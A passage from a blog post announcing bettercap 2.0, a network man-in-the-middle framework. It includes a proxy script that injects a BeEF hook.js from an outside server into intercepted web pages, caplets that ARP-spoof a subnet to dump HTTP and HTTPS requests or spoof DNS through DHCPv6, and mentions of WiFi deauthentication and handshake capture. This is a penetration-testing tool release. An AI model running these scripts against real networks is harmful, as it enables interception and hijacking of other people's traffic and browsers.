{
  "Source": "www.evilsocket.net",
  "Title": "All Hail Bettercap 2.0, One Tool to Rule Them All.",
  "Link": "https://www.evilsocket.net/2018/02/27/All-hail-bettercap-2-0-one-tool-to-rule-them-all/",
  "Content": "\u003cdiv class=\"content\" itemprop=\"articleBody\"\u003e\n\u003cp\u003eIt’s with immense pleasure that I announce the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/bettercap/bettercap/releases/tag/v2.0.0\"\u003erelease of the second generation of bettercap\u003c/a\u003e, a complete reimplementation of the most complete and advanced Man-in-the-Middle attack framework. This release not only brings MITM attacks to the next level, but it aims to be the reference framework for network monitoring (we \u0026lt;3 blueteams too), 802.11, BLE attacks and more! :D\u003c/p\u003e\n\u003ccenter\u003e\n\u003cstrong style=\"font-size:25px\"\u003e\nベッターキャップ！\n\u003c/strong\u003e\n\u003cimg width=\"200px\" src=\"https://www.bettercap.org/img/logo.png\"/\u003e\n\u003c/center\u003e\n\u003cspan id=\"more\"\u003e\u003c/span\u003e\n\u003cp\u003eThe first thing I want to mention is the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/orgs/bettercap/people\"\u003eamazing team\u003c/a\u003e that helped me debugging during endless sessions on Windows, or implemented new features that changed the tool radically, or tested, or gave ideas, or reported bugs (on GitHub, not on Twitter -.-) … \u003cstrong\u003eyou guys rock\u003c/strong\u003e and I am so lucky, \u003cstrong\u003ethank you\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eLet’s get started :D\u003c/p\u003e\n\u003ch3 id=\"Performances\"\u003e\u003ca href=\"#Performances\" class=\"headerlink\" title=\"Performances\"\u003e\u003c/a\u003ePerformances\u003c/h3\u003e\u003cp\u003eAs who’s following either me or \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://twitter.com/bettercap\"\u003ebettercap\u003c/a\u003e itself on Twitter probably knows, the biggest change has been in the underlying technology and framework that bettercap relies upon, we switched from a Ruby application, to a compiled Go application and this increased performances tremendously for several reasons. \u003c/p\u003e\n\u003cp\u003eFirst, we’re not victims of a \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://en.wikipedia.org/wiki/Global_interpreter_lock\"\u003eGIL\u003c/a\u003e anymore, this plus Go’s amazing concurrency mechanisms allowes bettercap 2.0 to run on low end hardware and still keep proxying hundreds of connections per second and forwarding tens of hundres of packets, while the previous version had an average of 5-6 connections/s due to how I/O requests were pooled by the interpreter while locking (aka the GIL sucks, a lot). Long story short, \u003cstrong\u003eno more unwanted network DoS when performing a MITM attack\u003c/strong\u003e!! F YEAH! \u003cem\u003e- put cool ninja move here -\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eAlso memory and CPU usage now are extremely optimized, you can run several instances of bettercap on your Raspberry Pi (or laptop, or router, or whatever … quite literally) and your CPU cores won’t even get to 20% unless you’re attacking a huge subnet … you can monitor LAN events in real time, while scanning for WiFi access points, while attacking BLE devices nearby and all at the same time, super fast, on low end hardware … but more on this later.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTL;DR:\u003c/strong\u003e FU Ruby, Go is amazing, fast and scales exceptionally well. \u003c/p\u003e\n\u003ch3 id=\"Ease-of-installation-and-Portability\"\u003e\u003ca href=\"#Ease-of-installation-and-Portability\" class=\"headerlink\" title=\"Ease of installation and Portability\"\u003e\u003c/a\u003eEase of installation and Portability\u003c/h3\u003e\u003cp\u003eNeedless to say, having \u003cstrong\u003ea single binary with zero dependencies\u003c/strong\u003e (or just libpcap.so on some platforms, thing that will be solved with a full static build soon) that you can just drop on a router/server/whatever and run is way better than the whole rubygems/rvm/rubyenv/whateverbs mess, while if you want to update to bleeding edge, all you have to do is install Go and then \u003ccode\u003ego get -u github.com/bettercap/bettercap\u003c/code\u003e … how freaking cool is that? :D\u003c/p\u003e\n\u003cp\u003eOh … and this new version supports \u003cstrong\u003eWindows, macOS, Android, Linux (arm, mips, mips64, etc)\u003c/strong\u003e and soon iOS ^_^\u003c/p\u003e\n\u003ch3 id=\"Old-but-brand-new\"\u003e\u003ca href=\"#Old-but-brand-new\" class=\"headerlink\" title=\"Old but brand new.\"\u003e\u003c/a\u003eOld but brand new.\u003c/h3\u003e\u003cp\u003eThe useful features of the old version have been ported to this new one and you will find them as \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/bettercap/bettercap/wiki\"\u003esession modules\u003c/a\u003e (really, RTFM, I spent hours writing that shit), so you’ll have \u003ccode\u003enet.recon\u003c/code\u003e searching for new hosts on your network while \u003ccode\u003enet.probe\u003c/code\u003e will keep probing for new ones, there’s our old friend \u003ccode\u003earp.spoof\u003c/code\u003e with his buddies \u003ccode\u003etcp.proxy\u003c/code\u003e, \u003ccode\u003ehttp.proxy\u003c/code\u003e and \u003ccode\u003ehttps.proxy\u003c/code\u003e (now \u003cstrong\u003eall proxies are scriptable in Javascript\u003c/strong\u003e) with some new \u003ccode\u003edhcp6.spoof\u003c/code\u003e friend. You have the \u003ccode\u003enet.sniff\u003c/code\u003eer of course, a \u003ccode\u003esyn.scan\u003c/code\u003ener if you need and several other core modules you can use to script your interactive session while the \u003ccode\u003eevents.stream\u003c/code\u003e will flow in front of you :D\u003c/p\u003e\n\u003cp\u003eTalking about scripting, as I said proxy modules are easily scriptable in JS:\u003c/p\u003e\n\u003cfigure class=\"highlight js\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"title\"\u003eonLoad\u003c/span\u003e(\u003cspan class=\"params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    log( \u003cspan class=\"string\"\u003e\u0026#34;BeefInject loaded.\u0026#34;\u003c/span\u003e );\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    log(\u003cspan class=\"string\"\u003e\u0026#34;targets: \u0026#34;\u003c/span\u003e + env[\u003cspan class=\"string\"\u003e\u0026#39;arp.spoof.targets\u0026#39;\u003c/span\u003e]);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"title\"\u003eonResponse\u003c/span\u003e(\u003cspan class=\"params\"\u003ereq, res\u003c/span\u003e) \u003c/span\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( res.ContentType.indexOf(\u003cspan class=\"string\"\u003e\u0026#39;text/html\u0026#39;\u003c/span\u003e) == \u003cspan class=\"number\"\u003e0\u003c/span\u003e ){\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003evar\u003c/span\u003e body = res.ReadBody();\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e( body.indexOf(\u003cspan class=\"string\"\u003e\u0026#39;\u0026lt;/head\u0026gt;\u0026#39;\u003c/span\u003e) != -\u003cspan class=\"number\"\u003e1\u003c/span\u003e ) {\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            res.Body = body.replace( \u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#39;\u0026lt;/head\u0026gt;\u0026#39;\u003c/span\u003e, \u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e                \u003cspan class=\"string\"\u003e\u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;http://beef-server:3000/hook.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt;\u0026#39;\u003c/span\u003e \u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            ); \u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eAlso, now we have “caplets”, which are basically like metasploit \u003ccode\u003e.rc\u003c/code\u003e files … enough ugly shell scripts because we don’t remember the command line for every attack scenario, now you can save your commands as \u003ccode\u003e.cap\u003c/code\u003e files and load them from your interactive session, let’s see a couple of interesting examples :D\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehttp-req-dump.cap\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eExecute an ARP spoofing attack on the whole network (by default) or on a host (using \u003ccode\u003e-eval\u003c/code\u003e as described), intercept HTTP and HTTPS requests with the \u003ccode\u003ehttp.proxy\u003c/code\u003e and \u003ccode\u003ehttps.proxy\u003c/code\u003e modules and dump them using the \u003ccode\u003ehttp-req-dumsp.js\u003c/code\u003e proxy script.\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e17\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e18\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e19\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e20\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e21\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e22\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e23\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e24\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e25\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e26\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e27\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# targeting the whole subnet by default, to make it selective:\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e#\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e#   sudo ./bettercap -caplet caplets/http-req-dump.cap -eval \u0026#34;set arp.spoof.targets 192.168.1.64\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# to make it less verbose\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# events.stream off\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# discover a few hosts \u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003enet.probe on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003esleep 1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003enet.probe off\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# uncomment to enable sniffing too\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# set net.sniff.verbose false\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# set net.sniff.local true\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# set net.sniff.filter tcp port 443\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# net.sniff on\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# we\u0026#39;ll use this proxy script to dump requests\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003eset\u003c/span\u003e https.proxy.script caplets/http-req-dump.js\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003eset\u003c/span\u003e http.proxy.script caplets/http-req-dump.js\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eclear\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# go ^_^\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ehttp.proxy on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ehttps.proxy on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003earp.spoof on\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003e\u003ccode\u003enetmon.cap\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eAn example of how to use the \u003ccode\u003eticker\u003c/code\u003e module, use this caplet to monitor activities on your network.\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# clear the screen and show data every second\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# this will create a nice animation of your\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# network activity\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003eset\u003c/span\u003e ticker.commands \u003cspan class=\"string\"\u003e\u0026#34;clear; net.show; events.show 20\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eticker on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003enet.probe on\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003e\u003ccode\u003eairodump.cap\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eSame as \u003ccode\u003enetmon.cap\u003c/code\u003e but will monitor for WiFi access points and clients instead of network hosts.\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# let\u0026#39;s add some api :D\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003einclude caplets/rest-api.cap\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003eset\u003c/span\u003e $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003eset\u003c/span\u003e ticker.commands clear; wifi.show; net.show; events.show 20\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# uncomment to disable channel hopping\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# set wifi.recon.channel 1\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ewifi.recon on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eticker on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eevents.clear\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eclear\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003e\u003ccode\u003emitm6.cap\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" rel=\"noopener\" href=\"https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/\"\u003eReroute IPv4 DNS requests by using DHCPv6 replies\u003c/a\u003e, start a HTTP server and DNS spoofer for \u003ccode\u003emicrosoft.com\u003c/code\u003e and \u003ccode\u003egoogle.com\u003c/code\u003e (works against Windows 10 ^_^):\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e17\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e18\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e19\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e20\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# let\u0026#39;s spoof Microsoft and Google ^_^\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003eset\u003c/span\u003e dns.spoof.domains microsoft.com, google.com\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003eset\u003c/span\u003e dhcp6.spoof.domains microsoft.com, google.com\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# every request http request to the spoofed hosts will come to us\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# let\u0026#39;s give em some contents\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003eset\u003c/span\u003e http.server.path caplets/www\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# serve files\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ehttp.server on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# redirect DNS request by spoofing DHCPv6 packets\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003edhcp6.spoof on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# send spoofed DNS replies ^_^\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003edns.spoof on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# set a custom prompt for ipv6\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003eset\u003c/span\u003e $ {by}{fw}{cidr} {fb}\u0026gt; {env.iface.ipv6} {reset} {bold}» {reset}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# clear the events buffer and the screen\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eevents.clear\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eclear\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eThese are just a few basic examples, I strongly encourage you to check the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/bettercap/caplets\"\u003ecaplets repository\u003c/a\u003e.\u003c/p\u003e\n\u003ch3 id=\"WiFi-BLE-and-more-to-come\"\u003e\u003ca href=\"#WiFi-BLE-and-more-to-come\" class=\"headerlink\" title=\"WiFi, BLE and more to come!\"\u003e\u003c/a\u003eWiFi, BLE and more to come!\u003c/h3\u003e\u003cp\u003eThere’s a brand new \u003ccode\u003ewifi.recon\u003c/code\u003e module that will either stick to a channel or perform channel hopping, both for 2.4Ghz and 5.0Ghz frequencies, reporting useful information on what’s going on at the \u003cstrong\u003e802.11\u003c/strong\u003e layer, the \u003ccode\u003ewifi.deauth\u003c/code\u003e module will deauth clients (doh!) while the \u003ccode\u003enet.sniff\u003c/code\u003eer will capture WPA2 handshakes (\u003cstrong\u003ebye bye kismet, airodump, airmon, wifite\u003c/strong\u003e, etc!). Meanwhile, the \u003ccode\u003eble.recon\u003c/code\u003e will discover every \u003cstrong\u003eBluetooth Low Energy\u003c/strong\u003e device you might want to inspect with \u003ccode\u003eble.enum\u003c/code\u003e or fuzz with \u003ccode\u003eble.write\u003c/code\u003e. Also \u003ccode\u003ewifi.fuzz\u003c/code\u003e and \u003ccode\u003eble.fuzz\u003c/code\u003e modules are work in progress, as well as \u003ccode\u003esdr.*\u003c/code\u003e modules and others.\u003c/p\u003e\n\u003cp\u003eDid I mention that this works on macOS and Windows too? :D Oh, and probably your macOS has \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://twitter.com/bettercap/status/967453847114407936\"\u003ea WiFi card capable of monitor mode and frames injection already\u003c/a\u003e :D This release is taking everything to the next level, we’re not just in the ethernet, \u003cstrong\u003ewe are everywhere\u003c/strong\u003e.\u003c/p\u003e\n\u003ch3 id=\"Habemus-API\"\u003e\u003ca href=\"#Habemus-API\" class=\"headerlink\" title=\"Habemus API\"\u003e\u003c/a\u003eHabemus API\u003c/h3\u003e\u003cp\u003eI believe this is functionally the biggest change, or at least the one with the biggest potential: \u003cstrong\u003ewe finally have a \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/bettercap/bettercap/wiki/api.rest\"\u003eREST API\u003c/a\u003e!\u003c/strong\u003e Imagine having a mobile client for your bettercap instance running in your dropbox, or simply imagine to develop a mobile application just by launching the Android executable, using the \u003ccode\u003ehttp.server\u003c/code\u003e module itself to serve a web UI and just create a WebView to render it … boom, easy mobile baby! :D\u003c/p\u003e\n\u003cp\u003eYou can read every single bit of information, you can have per IP realtime network statistics, you can send commands, wait for events … the sky is the limit!!! \u003cem\u003e-put evil laugh here-\u003c/em\u003e\u003c/p\u003e\n\u003ccenter\u003e\n\u003cblockquote 